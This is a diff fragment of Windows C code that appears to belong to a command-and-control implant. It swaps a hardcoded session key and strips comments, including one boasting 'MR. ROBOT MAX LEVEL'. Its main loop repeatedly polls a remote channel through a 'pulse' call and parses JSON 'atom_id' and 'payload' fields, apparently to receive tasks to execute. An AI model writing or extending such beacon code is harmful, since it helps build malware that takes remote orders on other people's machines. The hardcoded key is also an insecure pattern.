@@ -91,19 +91,17 @@ DWORD WINAPI NetworkAtomMain(LPVOID lpParam) {
     HANDLE hPipe = IPC_ConnectToPipe(pConfig->dwAtomId);
     if (!hPipe) return 1;
 
-    BYTE SharedSessionKey[] = "LdRrpJFuq4uq1smR";
+    BYTE SharedSessionKey[] = "YiZZCxy3SLMsIdhN";
 
     while (TRUE) {
         char szTaskBuffer[2048] = { 0 };
         TransmitPulse(NULL, 0, szTaskBuffer, 2048);
 
         if (strlen(szTaskBuffer) > 0 && strstr(szTaskBuffer, "\"atom_id\"")) {
-            /* MR. ROBOT MAX LEVEL - RESILIENT JSON EXTRACTOR */
             char* pAtom = strstr(szTaskBuffer, "\"atom_id\"");
             char* pPayload = strstr(szTaskBuffer, "\"payload\"");
 
             if (pAtom && pPayload) {
-                // Find the colon separators dynamically
                 char* pAtomColon = strchr(pAtom, ':');
                 char* pPayloadColon = strchr(pPayload, ':');
 
